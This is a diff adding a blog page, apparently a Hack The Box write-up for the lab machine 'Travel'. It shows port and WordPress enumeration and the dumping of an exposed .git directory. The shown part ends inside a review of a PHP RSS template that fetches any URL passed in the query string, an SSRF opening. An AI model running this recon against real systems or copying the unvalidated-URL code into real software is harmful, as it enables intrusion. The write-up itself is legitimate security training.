@@ -1,0 +1,1587 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    
+    
+    <meta property="article:tag" content="hackthebox" />
+    
+    <meta property="article:tag" content="htb" />
+    
+    <meta property="article:tag" content="boot2root" />
+    
+    <meta property="article:tag" content="writeup" />
+    
+    <meta property="article:tag" content="write-up" />
+    
+    <meta property="article:tag" content="linux" />
+    
+    <meta property="article:tag" content="SimplePie" />
+    
+    <meta property="article:tag" content="RSS" />
+    
+    <meta property="article:tag" content="code-review" />
+    
+    <meta property="article:tag" content="code review" />
+    
+    <meta property="article:tag" content="SSRF" />
+    
+    <meta property="article:tag" content="server-side resource forgery" />
+    
+    <meta property="article:tag" content="server side resource forgery" />
+    
+    <meta property="article:tag" content="PHP deserialization" />
+    
+    <meta property="article:tag" content="sql" />
+    
+    <meta property="article:tag" content="sql backup" />
+    
+    <meta property="article:tag" content="ldap" />
+    
+    <meta property="article:tag" content="ldif" />
+    
+    <meta property="article:tag" content="ldapsearch" />
+    
+    <meta property="article:tag" content="ldapmodify" />
+    
+    <meta property="article:tag" content="travel" />
+    
+    <meta property="article:tag" content="travel.htb" />
+        
+
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="HTB Travel">
+    <meta name="twitter:description" content="10.10.10.189 | 40 pts">
+    <meta name="twitter:site" content="@jebidiah-anthony" />
+    <meta name="twitter:creator" content="@feeeellliix">
+
+    
+    <meta property="og:image" content="https://jebidiah-anthony.github.io/boxes/screenshots/62_travel/travel.png" />
+    
+
+    
+    <meta property="og:title" content="HTB Travel" />
+    
+
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>HTB Travel | jebidiah-anthony</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="HTB Travel" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="10.10.10.189 40 pts" />
+<meta property="og:description" content="10.10.10.189 40 pts" />
+<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/62_Travel.html" />
+<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/62_Travel.html" />
+<meta property="og:site_name" content="jebidiah-anthony" />
+<script type="application/ld+json">
+{"description":"10.10.10.189 40 pts","@type":"WebPage","headline":"HTB Travel","url":"https://jebidiah-anthony.github.io/boxes/62_Travel.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <style>
+      .user_host { color: green; }
+      .sys_dir { color: #779ECB; }
+      p { color:#aaa; }
+      header { margin-bottom: 0px; }
+      .header .navbtn {
+	position: fixed;
+	width: 0px;
+	visibility: hidden;
+      }
+      .header .title { 
+	padding-left: 69px;
+	vertical-align: middle;
+      }
+      .header .title h2 { margin: 0; } 
+
+      .container {
+	max-width: 1200px;
+      }
+      .sidebar {
+        border-right: 1px dashed #b5e853;
+	bottom: 0;
+        height: 100%;
+	overflow: auto;
+	padding: 10px 10px 10px 10px;
+        position: fixed;
+	top: 0;
+        width: 230px;
+      }
+      .openbtn { 
+	color:#b5e853;
+	font-size:30px;
+	cursor:pointer
+      }
+      .closebtn {
+	color:#b5e853;
+	font-size:69px;
+	cursor:pointer;
+	position:absolute;
+	top:0;
+	right:25px;
+	font-size:36px;
+	margin-left:50px;
+	visibility:hidden;
+      }
+      
+      .ctf_content {
+        margin-left: 250px;
+	padding-bottom: 5px;
+      }
+      .ctf_content h2 {	padding: 20px 0px 0px 10px; }
+      .ctf_content h3 { margin: 20px 0px 0px 10px; }
+      .ctf_content img {
+ 	display: block;
+	margin-left: auto;
+	margin-right: auto;
+	max-width: 100%;
+	padding: 0 10px 0 0;
+      }
+      .ctf_content table { padding: 0 15px; }
+
+      #main_content h1 { padding: 20px 0px 0px 8px; }
+      #main_content h2, p, pre { 
+	padding-right:10px;
+	padding-left:15px; 
+      }
+      #main_content h4 { 
+        margin: 20px 0px 10px 0px; 
+        padding-left: 25px; 
+      }
+      #main_content ol, ul { margin: 0 0 0 10px; }
+
+      .highlighter-rouge { padding: 0 10px 0 10px; }
+
+      .section-divider{
+        border-bottom: 1.5px solid #b5e853;
+        padding-top:28px;
+        width:55%;
+      }
+      
+      @media screen and (min-width: 801px) {
+	.ctf_content {
+          margin-left: 250px;
+	  padding-bottom: 5px;
+        }
+      }
+      @media screen and (max-width: 800px) {
+        header {
+	  background-color: #202020;
+	  height: 80px;
+	  padding: 0px 0 0 0;
+	  position: fixed;
+	  top: 0;
+	}
+        .header .navbtn {
+          height: 80px;
+	  padding: 18px 0 0 20px;
+          visibility: visible;
+	  width: 100px;
+        }
+	.header .title { padding-left: 100px; }
+	.header .title h1 { padding-top: 5px; }
+        .header .title h2 { margin: 0; }
+
+	.container {
+	  width:100%;
+	}
+	.sidebar {
+          width: 0;
+          z-index: 1;
+          overflow-x: hidden;
+	  padding: 0;
+          transition: 0.5s;
+	}
+	.sidebar h2 { 
+	  font-size: 18px; 
+	  padding: 10px 10px 5px 10px;
+	}
+	.sidebar div { 
+	  font-size: 15px; 
+	  padding: 5px 10px 5px 10px;
+	}
+	.closebtn { visibility:visible; }
+
+	.highlighter-rouge { padding: 0 0 0 0; }
+
+	.ctf_content {
+	  margin: 0;
+	}
+	.ctf_content h2 { padding: 15px 0px 0px 5px; }
+        .ctf_content h3 { margin: 15px 10px 0px 15px; }
+        .ctf_content img {
+	  max-width: 100%;
+	  padding: 0 10px 0 0;
+        }
+	.ctf_content table { 
+	  margin: 0 10px 0px -8px;
+	  min-width: 800px;
+	}
+
+        #main_content { margin-top:80px; }
+	#main_content code { font-size: 15px; }
+	#main_content h1 { font-size: 25px; }
+	#main_content h2 { font-size: 22px; }
+	#main_content h3 { font-size: 18px; }
+	#main_content h4 { padding-left: 20px; }
+	#main_content ol, ul {
+	  font-size: 14px;
+	  margin: 0 0 0 12px;
+	  padding: 0 0 0 25px;
+	}
+	#main_content table { font-size: 14px; }
+      }
+
+      @media screen and (max-width: 480px) {
+        header {
+	  background-color: #202020;
+	  height: 70px;
+	  padding: 0px 0 0 0;
+	  position: fixed;
+	  top: 0;
+	}
+        .header .navbtn {
+          height: 70px;
+	  padding: 14px 0 0 18px;
+        }
+	.header .title { padding-left: 100px; }
+	.header .title h1 { font-size:22px; }
+        .header .title h2 { font-size:16px; }
+
+	#main_content code { font-size: 13px; }
+        #main_content ol, ul {
+	  font-size: 13px;
+	  margin: 0 0 0 12px;
+	  padding: 0 0 0 25px;
+	}
+	#main_content table { font-size: 13px; }
+      }
+    </style>
+
+  </head>
+
+  <body>
+    <div class="container">
+       <div id="sidebar" class="sidebar">
+         <span class="closebtn" onclick="closeNav()">&times;</span>      
+	 <div><h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>
+
+<div style="padding-top:10px">
+  
+  > <a href="/">whoami</a>
+  
+</div>
+<div style="padding-top:10px">  
+  >  <a href="/htb.html">
+    
+    <strong style="color:orange">htb writeups</strong>
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/ctf.html">
+    
+    ctf writeups
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/projects.html">
+    
+    projects
+    
+  </a>
+</div>
+</div>
+	 <div style="padding-bottom:20px">
+           
+             <h2 style="margin-bottom:0; padding-top: 20px">[HTB BOXES]</h2>
+
+
+<div style="padding-top:10px">
+  
+  > <strong style="color:orange">Travel</strong>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/61_Quick.html">Quick</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/49_Unbalanced.html">Unbalanced</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/38_Bitlab.html">Bitlab</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/33_Safe.html">Safe</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/32_Ellingson.html">Ellingson</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html">WriteUp</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/30_swagshop.html">swagshop</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/29_kryptos.html">kryptos</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/28_Luke.html">Luke</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/26_CTF.html">CTF</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/25_Friendzone.html">Friendzone</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/24_Flujab.html">Flujab</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/23_Help.html">Help</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/22_Chaos.html">Chaos</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/21_Lightweight.html">Lightweight</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/20_Irked.html">Irked</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/19_Teacher.html">Teacher</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/15_Mischief.html">Mischief</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/14_Waldo.html">Waldo</a>
+  
+</div>
+
+
+
+	   
+	 </div>
+       </div>
+       <div id="content" class="ctf_content">
+	 <header>
+           <div class="header">
+             <div class="navbtn">
+               <span class="openbtn" onclick="openNav()">&#9776;</span>
+	     </div>
+	     <div class="title">
+               <h1>jebidiah-anthony</h1>
+               <h2 style="padding:0 0 0 0">write-ups and what not</h2>
+	     </div>
+           </div>
+         </header>
+         <section id="main_content"><h1 id="htb-travel-101010189"><span style="color:red">HTB Travel (10.10.10.189)</span></h1>
+
+<hr />
+
+<h2 id="part-1---initial-enumeration">PART 1 :  INITIAL ENUMERATION</h2>
+
+<h3 id="11-nmap">1.1 nmap</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">--min-rate</span> 3000 <span class="nt">-oN</span> nmap-tcp.initial <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.189
+
+  PORT    STATE SERVICE
+  22/tcp  open  ssh
+  80/tcp  open  http
+  443/tcp open  https
+  
+<span class="nv">$ </span>nmap <span class="nt">-oN</span> nmap-tcp <span class="nt">-p</span> 22,80,443 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.189
+
+  PORT    STATE SERVICE  VERSION
+  22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+  | ssh-hostkey: 
+  |   3072 d3:9f:31:95:7e:5e:11:45:a2:b4:b6:34:c0:2d:2d:bc <span class="o">(</span>RSA<span class="o">)</span>
+  |   256 ef:3f:44:21:46:8d:eb:6c:39:9c:78:4f:50:b3:f3:6b <span class="o">(</span>ECDSA<span class="o">)</span>
+  |_  256 3a:01:bc:f8:57:f5:27:a1:68:1d:6a:3d:4e:bc:21:1b <span class="o">(</span>ED25519<span class="o">)</span>
+  80/tcp  open  http     nginx 1.17.6
+  | http-methods: 
+  |_  Supported Methods: GET HEAD
+  |_http-server-header: nginx/1.17.6
+  |_http-title: Travel.HTB
+  443/tcp open  ssl/http nginx 1.17.6
+  | http-methods: 
+  |_  Supported Methods: GET HEAD
+  |_http-server-header: nginx/1.17.6
+  |_http-title: Travel.HTB - SSL coming soon.
+  | ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.travel.htb/organizationName<span class="o">=</span>Travel.HTB/countryName<span class="o">=</span>UK
+  | Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
+  | Issuer: <span class="nv">commonName</span><span class="o">=</span>www.travel.htb/organizationName<span class="o">=</span>Travel.HTB/countryName<span class="o">=</span>UK
+  | Public Key <span class="nb">type</span>: rsa
+  | Public Key bits: 2048
+  | Signature Algorithm: sha256WithRSAEncryption
+  | Not valid before: 2020-04-23T19:24:29
+  | Not valid after:  2030-04-21T19:24:29
+  | MD5:   ef0a a4c1 fbad 1ac4 d160 58e3 beac 9698
+  |_SHA-1: 0170 7c30 db3e 2a93 cda7 7bbe 8a8b 7777 5bcd 0498
+  Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<ul>
+  <li>Various subdomains were found – <code class="highlighter-rouge">www.travel.htb</code>, <code class="highlighter-rouge">blog.travel.htb</code>, <code class="highlighter-rouge">blog-dev.travel.htb</code>.</li>
+  <li>UDP scan using <code class="highlighter-rouge">nmap</code>, doesn’t yield any result.</li>
+</ul>
+
+<hr />
+
+<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>
+
+<h3 id="21-tcp-port-80--http">2.1 TCP PORT 80 : HTTP</h3>
+
+<h4 id="211-httptravelhtb">2.1.1 http[://]travel.htb</h4>
+
+<p><img src="./screenshots/62_travel/80_travel.png" alt="80_travel" /></p>
+
+<h4 id="212-httpblogtravelhtb">2.1.2 http[://]blog.travel.htb</h4>
+
+<p><img src="./screenshots/62_travel/80_blog.png" alt="80_blog" />
+This subdomain is hosting a WordPress application. Using <code class="highlighter-rouge">wpscan</code> to enumerate the service:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wpscan <span class="nt">--update</span>
+
+<span class="nv">$ </span>wpscan <span class="nt">--output</span> 80_wpscan_blog.txt <span class="nt">--url</span> http://blog.travel.htb
+
+  <span class="o">[</span>+] Headers
+   | Interesting Entries:
+   |  - Server: nginx/1.17.6
+   |  - X-Powered-By: PHP/7.3.16
+   | Found By: Headers <span class="o">(</span>Passive Detection<span class="o">)</span>
+   | Confidence: 100%
+
+  <span class="o">[</span>+] robots.txt found: http://blog.travel.htb/robots.txt
+   | Interesting Entries:
+   |  - /wp-admin/
+   |  - /wp-admin/admin-ajax.php
+   | Found By: Robots Txt <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   | Confidence: 100%
+
+  <span class="o">[</span>+] XML-RPC seems to be enabled: http://blog.travel.htb/xmlrpc.php
+   | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   | Confidence: 100%
+   | References:
+   |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+   |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+  <span class="o">[</span>+] WordPress readme found: http://blog.travel.htb/readme.html
+   | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   | Confidence: 100%
+
+  <span class="o">[</span>+] The external WP-Cron seems to be enabled: http://blog.travel.htb/wp-cron.php
+   | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+   | Confidence: 60%
+   | References:
+   |  - https://www.iplocation.net/defend-wordpress-from-ddos
+   |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+  <span class="o">[</span>+] WordPress version 5.4 identified <span class="o">(</span>Insecure, released on 2020-03-31<span class="o">)</span><span class="nb">.</span>
+   | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+   |  - http://blog.travel.htb/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.4&lt;/generator&gt;
+   |  - http://blog.travel.htb/comments/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.4&lt;/generator&gt;
+
+  <span class="o">[</span>+] WordPress theme <span class="k">in </span>use: twentytwenty
+   | Location: http://blog.travel.htb/wp-content/themes/twentytwenty/
+   | Last Updated: 2021-03-09T00:00:00.000Z
+   | Readme: http://blog.travel.htb/wp-content/themes/twentytwenty/readme.txt
+   | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 1.7
+   | Style URL: http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver<span class="o">=</span>1.2
+   | Style Name: Twenty Twenty
+   | Style URI: https://wordpress.org/themes/twentytwenty/
+   | Description: Our default theme <span class="k">for </span>2020 is designed to take full advantage of the flexibility of the block editor...
+   | Author: the WordPress team
+   | Author URI: https://wordpress.org/
+   |
+   | Found By: Css Style In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+   | Confirmed By: Css Style In 404 Page <span class="o">(</span>Passive Detection<span class="o">)</span>
+   |
+   | Version: 1.2 <span class="o">(</span>80% confidence<span class="o">)</span>
+   | Found By: Style <span class="o">(</span>Passive Detection<span class="o">)</span>
+   |  - http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver<span class="o">=</span>1.2, Match: <span class="s1">'Version: 1.2'</span>
+
+  <span class="o">[</span>i] No plugins Found.
+  <span class="o">[</span>i] No Config Backups Found.
+</code></pre></div></div>
+
+<h4 id="213-httpblog-devtravelhtb">2.1.3 http[://]blog-dev.travel.htb</h4>
+
+<p><img src="./screenshots/62_travel/80_blog-dev.png" alt="80_blog-dev" /></p>
+
+<p>The landing page returns forbidden and doing more enumeration using <code class="highlighter-rouge">nmap</code> returns:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-p</span> 80 <span class="nt">--script</span> safe,vuln <span class="nt">-Pn</span> blog-dev.travel.htb
+  
+  PORT   STATE SERVICE
+  80/tcp open  http
+  <span class="o">[</span>...omitted...]
+  | http-enum: 
+  |_  /.git/HEAD: Git folder
+  |_http-fetch: Please enter the <span class="nb">complete </span>path of the directory to save data <span class="k">in</span><span class="nb">.</span>
+  | http-git: 
+  |   10.10.10.189:80/.git/
+  |     Git repository found!
+  |     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">'description'</span> to name the...
+  |_    Last commit message: moved to git 
+  | http-headers: 
+  |   Server: nginx/1.17.6
+  <span class="o">[</span>...omitted...]
+  |   
+  |_  <span class="o">(</span>Request <span class="nb">type</span>: GET<span class="o">)</span>
+  <span class="o">[</span>...omitted...]
+</code></pre></div></div>
+
+<p>A <code class="highlighter-rouge">/.git</code> directory was found but navigating to it also returns a <strong>403 Response</strong> (Forbidden). Attempting to use <code class="highlighter-rouge">gobuster</code> to see if responses other than <strong>403</strong> could be seen:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-o</span> 80_gobuster_blog-dev_git.txt <span class="nt">--timeout</span> 5s <span class="nt">-u</span> http://blog-dev.travel.htb/.git <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
+
+  /index                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 297]
+  /info                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 170] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://blog-dev.travel.htb/.git/info/]
+  /config               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 92]                                             
+  /logs                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 170] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://blog-dev.travel.htb/.git/logs/]
+  /objects              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 170] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://blog-dev.travel.htb/.git/objects/]
+  /description          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 73]                                                
+  /branches             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 170] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://blog-dev.travel.htb/.git/branches/]
+  <span class="o">[</span>...omitted...]
+</code></pre></div></div>
+
+<p>Since only the root seems to be unreadable, maybe we could extract the git files using <a href="https://github.com/arthaud/git-dumper"><strong>git-dumper.py</strong></a></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir </span>80_git_blog-dev
+
+<span class="nv">$ </span>./git-dumper/git_dumper.py http://blog-dev.travel.htb ./80_git_blog-dev
+
+  <span class="o">[</span>-] Testing http://blog-dev.travel.htb/.git/HEAD <span class="o">[</span>200]
+  <span class="o">[</span>-] Testing http://blog-dev.travel.htb/.git/ <span class="o">[</span>403]
+  <span class="o">[</span>-] Fetching common files
+  <span class="o">[</span>...omitted...]
+  
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span> ./80_git_blog-dev
+
+  .git  README.md  rss_template.php  template.php
+  
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span> ./80_git_blog-dev/.git
+
+  COMMIT_EDITMSG  config  description  HEAD  hooks  index  info  logs  objects  refs
+
+<span class="nv">$ </span><span class="nb">cat</span> ./80_git_blog-dev/.git/logs/HEAD 
+
+  0000000000000000000000000000000000000000 0313850ae948d71767aff2cc8cc0f87a0feeef63 jane &lt;jane@travel.htb&gt; 1587458094 <span class="nt">-0700</span>	commit <span class="o">(</span>initial<span class="o">)</span>: moved to git
+
+<span class="nv">$ </span><span class="nb">cat</span> ./80_git_blog-dev/README.md
+
+  <span class="c"># Rss Template Extension</span>
+
+  Allows rss-feeds to be shown on a custom wordpress page.
+
+  <span class="c">## Setup</span>
+
+  <span class="k">*</span> <span class="sb">`</span>git clone https://github.com/WordPress/WordPress.git<span class="sb">`</span>
+  <span class="k">*</span> copy rss_template.php &amp; template.php to <span class="sb">`</span>wp-content/themes/twentytwenty<span class="sb">`</span> 
+  <span class="k">*</span> create logs directory <span class="k">in</span> <span class="sb">`</span>wp-content/themes/twentytwenty<span class="sb">`</span> 
+  <span class="k">*</span> create page <span class="k">in </span>backend and choose rss_template.php as theme
+
+  <span class="c">## Changelog</span>
+
+  - temporarily disabled cache compression
+  - added additional security checks 
+  - added caching
+  - added rss template
+
+  <span class="c">## ToDo</span>
+
+  - finish logging implementation 
+</code></pre></div></div>
+
+<p>The contents of the <code class="highlighter-rouge">.git</code> folder seems to pertain to the deployment of and RSS feed for other services. A user, <strong>jane</strong> (jane@travel.htb), was also found to have been responsible for the creation of the repository. And based on the output of <code class="highlighter-rouge">wpscan</code> from <strong>http[://]blog.travel.htb</strong>, the RSS service may have been deployed to it as well.</p>
+
+<h3 id="22-tcp-port-443--https">2.2 TCP PORT 443 : HTTPS</h3>
+
+<p><img src="./screenshots/62_travel/443_travel.jpg" alt="443_travel" /></p>
+
+<p>All subdomains, when accessed via HTTPS, returns an under construction page with the following message:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We are currently sorting out how to get SSL 
+implemented with multiple domains properly. Also we 
+are experiencing severe performance problems on SSL 
+still.
+
+In the meantime please use our non-SSL websites.
+
+Thanks for your understanding,
+admin 
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>
+
+<h3 id="31-the-rss-feed">3.1 The RSS Feed</h3>
+
+<h4 id="311-rss-in-blogtravelhtb">3.1.1 RSS in blog.travel.htb:</h4>
+
+<p>Looking back at the output of <code class="highlighter-rouge">wpscan</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">[+] WordPress version 5.4 identified (Insecure, released on 2020-03-31).
+ | Found By: Rss Generator (Passive Detection)
+</span><span class="gp"> |  - http://blog.travel.htb/feed/, &lt;generator&gt;</span>https://wordpress.org/?v<span class="o">=</span>5.4&lt;/generator&gt;
+<span class="gp"> |  - http://blog.travel.htb/comments/feed/, &lt;generator&gt;</span>https://wordpress.org/?v<span class="o">=</span>5.4&lt;/generator&gt;
+</code></pre></div></div>
+
+<p>As well as the landing page of http[://]blog.travel.htb, there is a link to <strong>Awesome RSS</strong> in the navigation bar:</p>
+
+<p><img src="./screenshots/62_travel/80_blog_rss.png" alt="80_blog_rss" /></p>
+
+<p>This brings you to <strong>http[://]blog.travel.htb/awesome-rss</strong>:</p>
+
+<p><img src="./screenshots/62_travel/80_blog_awesome-rss.png" alt="80_blog_awesome-rss" /></p>
+
+<h4 id="313-review-of-rss_templatephp">3.1.3 Review of <strong>rss_template.php</strong>:</h4>
+
+<p>This was extracted from the contents of http[://]blog-dev.travel.htb/.git/</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="cm">/*
+	Template Name: Awesome RSS
+	*/</span>
+	<span class="k">include</span><span class="p">(</span><span class="s1">'template.php'</span><span class="p">);</span>
+	<span class="nx">get_header</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+[...omitted...]
+<span class="cp">&lt;?php</span>
+	<span class="k">function</span> <span class="nf">get_feed</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
+    	<span class="k">require_once</span> <span class="nx">ABSPATH</span> <span class="o">.</span> <span class="s1">'/wp-includes/class-simplepie.php'</span><span class="p">;</span>	    
+    	<span class="nv">$simplepie</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>	  
+     	<span class="nv">$data</span> <span class="o">=</span> <span class="nx">url_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+     	<span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+         	<span class="nv">$simplepie</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimplePie</span><span class="p">();</span>
+         	<span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">set_cache_location</span><span class="p">(</span><span class="s1">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</span><span class="p">);</span>
+         	<span class="c1">//$simplepie-&gt;set_raw_data($data);</span>
+         	<span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">set_feed_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+         	<span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">();</span>
+         	<span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">handle_content_type</span><span class="p">();</span>
+         	<span class="k">if</span> <span class="p">(</span><span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">)</span> <span class="p">{</span>
+            	<span class="nb">error_log</span><span class="p">(</span><span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">);</span>
+             	<span class="nv">$simplepie</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+             	<span class="nv">$failed</span> <span class="o">=</span> <span class="nx">True</span><span class="p">;</span>
+         	<span class="p">}</span>
+     	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+         	<span class="nv">$failed</span> <span class="o">=</span> <span class="nx">True</span><span class="p">;</span>
+     	<span class="p">}</span>
+     	<span class="k">return</span> <span class="nv">$simplepie</span><span class="p">;</span>
+	<span class="p">}</span>
+
+ 	<span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">];</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s2">"custom_feed_url"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
+		<span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"="</span><span class="p">,</span> <span class="nv">$url</span><span class="p">));</span> 	
+		<span class="nv">$url</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 	
+ 	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+ 	 	<span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://www.travel.htb/newsfeed/customfeed.xml"</span><span class="p">;</span>
+ 	<span class="p">}</span>
+ 	<span class="nv">$feed</span> <span class="o">=</span> <span class="nx">get_feed</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span> 
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$feed</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">())</span> <span class="p">{</span>
+		<span class="k">echo</span> <span class="s1">'&lt;div class="sp_errors"&gt;'</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
